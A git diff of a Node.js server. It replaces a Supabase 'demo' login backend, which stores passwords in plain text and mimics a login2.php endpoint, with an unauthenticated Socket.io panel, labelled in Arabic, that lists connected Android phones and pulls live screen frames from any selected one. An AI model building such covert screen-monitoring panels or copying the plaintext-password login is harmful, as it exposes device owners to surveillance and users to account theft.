@@ -1,414 +1,116 @@
-const express = require("express");
-const { createClient } = require("@supabase/supabase-js");
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
 
 const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
+// تخزين الأجهزة المتصلة حالياً
+const devices = new Map();
+
+// واجهة لوحة التحكم (تظهر لك عندما تدخل رابط موقعك على Render)
+app.get('/', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="ar" dir="rtl">
+        <head>
+            <meta charset="UTF-8">
+            <title>لوحة تحكم الأجهزة والبث الحي</title>
+            <style>
+                body { font-family: Tahoma, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
+                h1 { text-align: center; color: #38bdf8; }
+                .container { display: flex; gap: 20px; margin-top: 20px; }
+                .sidebar { width: 300px; background: #1e293b; padding: 15px; border-radius: 8px; height: 80vh; overflow-y: auto; }
+                .main-screen { flex: 1; background: #1e293b; padding: 15px; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+                .device-item { padding: 10px; margin-bottom: 10px; background: #334155; border-radius: 6px; cursor: pointer; transition: 0.2s; }
+                .device-item:hover { background: #475569; }
+                .device-item.active { border: 2px solid #38bdf8; }
+                img#streamView { max-width: 100%; max-height: 70vh; border: 2px solid #475569; border-radius: 6px; background: black; }
+            </style>
+        </head>
+        <body>
+            <h1>لوحة التحكم والتحكم بالأجهزة المتصلة</h1>
+            <div class="container">
+                <div class="sidebar" id="deviceList">
+                    <h3>الأجهزة المتصلة</h3>
+                    <p style="color: #94a3b8;">في انتظار اتصال الأجهزة...</p>
+                </div>
+                <div class="main-screen">
+                    <h3 id="selectedDeviceTitle">اختر جهازاً لعرض البث</h3>
+                    <img id="streamView" alt="بث الشاشة سيظهر هنا..." />
+                </div>
+            </div>
+
+            <script src="/socket.io/socket.io.js"></script>
+            <script>
+                const socket = io();
+                let currentDeviceId = null;
+
+                socket.on('update_devices', (devicesList) => {
+                    const listDiv = document.getElementById('deviceList');
+                    listDiv.innerHTML = '<h3>الأجهزة المتصلة</h3>';
+                    
+                    if (devicesList.length === 0) {
+                        listDiv.innerHTML += '<p style="color: #94a3b8;">لا توجد أجهزة متصلة حالياً.</p>';
+                        return;
+                    }
+
+                    devicesList.forEach(dev => {
+                        const div = document.createElement('div');
+                        div.className = 'device-item' + (currentDeviceId === dev.id ? ' active' : '');
+                        div.innerHTML = \`<strong>\${dev.name}</strong><br><small style="color:#94a3b8;">ID: \${dev.id}</small>\`;
+                        div.onclick = () => selectDevice(dev.id, dev.name);
+                        listDiv.appendChild(div);
+                    });
+                });
+
+                function selectDevice(id, name) {
+                    currentDeviceId = id;
+                    document.getElementById('selectedDeviceTitle').innerText = 'عرض بث الجهاز: ' + name;
+                    socket.emit('request_stream', id);
+                }
+
+                socket.on('screen_frame', (frameData) => {
+                    document.getElementById('streamView').src = frameData;
+                });
+            </script>
+        </body>
+        </html>
+    `);
+});
+
+// إدارة الاتصالات عبر WebSockets
+io.on('connection', (socket) => {
+    console.log('مستخدم أو جهاز متصل جديد:', socket.id);
+
+    // إذا كان المتصل هو تطبيق الـ Android
+    socket.on('register_device', (deviceInfo) => {
+        devices.set(socket.id, { id: socket.id, name: deviceInfo.name || 'هاتف غير محدد' });
+        io.emit('update_devices', Array.from(devices.values()));
+    });
+
+    // استقبال لقطات الشاشة من الهاتف وإرسالها للمتصفح الذي يراقب هذا الجهاز
+    socket.on('send_frame', (data) => {
+        // data يحتوي على معرف الجهاز وإطار الصورة
+        io.to(data.targetBrowserSocketId).emit('screen_frame', data.frame);
+    });
+
+    // عندما يختار لوحة التحكم جهازا للبث
+    socket.on('request_stream', (targetDeviceId) => {
+        socket.targetDevice = targetDeviceId;
+        // إخبار الهاتف المستهدف ببدء إرسال الإطارات لهذا المتصفح
+        io.to(targetDeviceId).emit('start_streaming_to', socket.id);
+    });
+
+    socket.on('disconnect', () => {
+        devices.delete(socket.id);
+        io.emit('update_devices', Array.from(devices.values()));
+        console.log('انقطع اتصال:', socket.id);
+    });
+});
+
 const PORT = process.env.PORT || 3000;
-
-// ===============================
-// Middleware
-// ===============================
-
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static("public"));
-
-// ===============================
-// Supabase
-// ===============================
-
-const supabaseUrl = process.env.SUPABASE_URL;
-const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
-
-if (!supabaseUrl || !supabaseKey) {
-  console.error("ERROR: Missing Supabase environment variables.");
-  process.exit(1);
-}
-
-const supabase = createClient(
-  supabaseUrl,
-  supabaseKey
-);
-
-// ===============================
-// Admin protection
-// ===============================
-
-const ADMIN_KEY = process.env.ADMIN_KEY;
-
-function checkAdmin(req, res, next) {
-  if (!ADMIN_KEY) {
-    return res.status(500).json({
-      success: false,
-      message: "ADMIN_KEY is not configured"
-    });
-  }
-
-  const providedKey = req.headers["x-admin-key"];
-
-  if (!providedKey || providedKey !== ADMIN_KEY) {
-    return res.status(401).json({
-      success: false,
-      message: "Unauthorized"
-    });
-  }
-
-  next();
-}
-
-// ===============================
-// Health check
-// ===============================
-
-app.get("/api/health", (req, res) => {
-  res.json({
-    success: true,
-    service: "demo-login-server",
-    database: "supabase"
-  });
-});
-
-// ===============================
-// Generate 7-digit account number
-// ===============================
-
-async function generateAccountNumber() {
-  for (let attempt = 0; attempt < 30; attempt++) {
-
-    const accountNumber = String(
-      Math.floor(1000000 + Math.random() * 9000000)
-    );
-
-    const { data, error } = await supabase
-      .from("demo_accounts")
-      .select("id")
-      .eq("account_number", accountNumber)
-      .maybeSingle();
-
-    if (error) {
-      throw error;
-    }
-
-    if (!data) {
-      return accountNumber;
-    }
-  }
-
-  throw new Error("Unable to generate unique account number");
-}
-
-// ===============================
-// Create Demo Account
-// ===============================
-
-app.post("/api/register", async (req, res) => {
-  try {
-
-    const name = String(req.body.name || "").trim();
-    const password = String(req.body.password || "");
-
-    if (!name) {
-      return res.status(400).json({
-        success: false,
-        message: "Name is required"
-      });
-    }
-
-    if (!password) {
-      return res.status(400).json({
-        success: false,
-        message: "Password is required"
-      });
-    }
-
-    if (name.length > 100) {
-      return res.status(400).json({
-        success: false,
-        message: "Name is too long"
-      });
-    }
-
-    const accountNumber = await generateAccountNumber();
-
-    const { data, error } = await supabase
-      .from("demo_accounts")
-      .insert({
-        account_number: accountNumber,
-        name: name,
-        password: password,
-        balance: 0
-      })
-      .select("account_number,name,balance,created_at")
-      .single();
-
-    if (error) {
-      console.error(error);
-
-      return res.status(500).json({
-        success: false,
-        message: "Could not create account"
-      });
-    }
-
-    res.json({
-      success: true,
-      message: "Demo account created successfully",
-      account_number: data.account_number,
-      name: data.name,
-      balance: data.balance,
-      created_at: data.created_at
-    });
-
-  } catch (error) {
-
-    console.error(error);
-
-    res.status(500).json({
-      success: false,
-      message: "Server error"
-    });
-  }
-});
-
-// ===============================
-// Login
-// Compatible with:
-// /api/login2.php
-// ===============================
-
-app.post("/api/login2.php", async (req, res) => {
-  try {
-
-    const account = String(
-      req.body.account_number || ""
-    ).trim();
-
-    const password = String(
-      req.body.password || ""
-    );
-
-    if (!account || !password) {
-      return res.json({
-        app_status: "current",
-        success: false,
-        message: "Account number and password are required",
-        p1: "invalid",
-        p2: "",
-        p3: "0",
-        p4: "valid"
-      });
-    }
-
-    if (!/^\d{7}$/.test(account)) {
-      return res.json({
-        app_status: "current",
-        success: false,
-        message: "Invalid account number",
-        p1: "invalid",
-        p2: "",
-        p3: "0",
-        p4: "valid"
-      });
-    }
-
-    const { data, error } = await supabase
-      .from("demo_accounts")
-      .select("account_number,name,password,balance")
-      .eq("account_number", account)
-      .maybeSingle();
-
-    if (error) {
-      console.error(error);
-
-      return res.status(500).json({
-        app_status: "current",
-        success: false,
-        message: "Database error",
-        p1: "invalid",
-        p2: "",
-        p3: "0",
-        p4: "valid"
-      });
-    }
-
-    if (!data || data.password !== password) {
-      return res.json({
-        app_status: "current",
-        success: false,
-        message: "Invalid account number or password",
-        p1: "invalid",
-        p2: "",
-        p3: "0",
-        p4: "valid"
-      });
-    }
-
-    // Keep balance as a String because
-    // some versions of the Demo app expect String values.
-    const balanceString = String(data.balance);
-
-    res.json({
-      app_status: "current",
-      success: true,
-
-      username: data.name,
-      account_number: data.account_number,
-      balance: Number(data.balance),
-
-      // Compatibility fields
-      p1: "success",
-      p2: data.name,
-      p3: balanceString,
-      p4: "valid",
-
-      message: "Login successful"
-    });
-
-  } catch (error) {
-
-    console.error(error);
-
-    res.status(500).json({
-      app_status: "current",
-      success: false,
-      message: "Server error",
-      p1: "invalid",
-      p2: "",
-      p3: "0",
-      p4: "valid"
-    });
-  }
-});
-
-// ===============================
-// Admin: Account Details
-// ===============================
-
-app.get(
-  "/api/admin/account/:accountNumber",
-  checkAdmin,
-  async (req, res) => {
-
-    try {
-
-      const accountNumber = String(
-        req.params.accountNumber || ""
-      ).trim();
-
-      if (!/^\d{7}$/.test(accountNumber)) {
-        return res.status(400).json({
-          success: false,
-          message: "Invalid account number"
-        });
-      }
-
-      const { data, error } = await supabase
-        .from("demo_accounts")
-        .select(
-          "account_number,name,balance,created_at,updated_at"
-        )
-        .eq("account_number", accountNumber)
-        .maybeSingle();
-
-      if (error) {
-        console.error(error);
-
-        return res.status(500).json({
-          success: false,
-          message: "Database error"
-        });
-      }
-
-      if (!data) {
-        return res.status(404).json({
-          success: false,
-          message: "Account not found"
-        });
-      }
-
-      res.json({
-        success: true,
-        account: data
-      });
-
-    } catch (error) {
-
-      console.error(error);
-
-      res.status(500).json({
-        success: false,
-        message: "Server error"
-      });
-    }
-  }
-);
-
-// ===============================
-// Admin: List Accounts
-// ===============================
-
-app.get(
-  "/api/admin/accounts",
-  checkAdmin,
-  async (req, res) => {
-
-    try {
-
-      const { data, error } = await supabase
-        .from("demo_accounts")
-        .select(
-          "account_number,name,balance,created_at,updated_at"
-        )
-        .order("created_at", {
-          ascending: false
-        });
-
-      if (error) {
-        console.error(error);
-
-        return res.status(500).json({
-          success: false,
-          message: "Database error"
-        });
-      }
-
-      res.json({
-        success: true,
-        accounts: data || []
-      });
-
-    } catch (error) {
-
-      console.error(error);
-
-      res.status(500).json({
-        success: false,
-        message: "Server error"
-      });
-    }
-  }
-);
-
-// ===============================
-// 404
-// ===============================
-
-app.use((req, res) => {
-
-  res.status(404).json({
-    success: false,
-    message: "Endpoint not found"
-  });
-
-});
-
-// ===============================
-// Start server
-// ===============================
-
-app.listen(PORT, "0.0.0.0", () => {
-
-  console.log(
-    `Demo server running on port ${PORT}`
-  );
-
+server.listen(PORT, () => {
+    console.log(`السيرفر يعمل بنجاح على المنفذ ${PORT}`);
 });
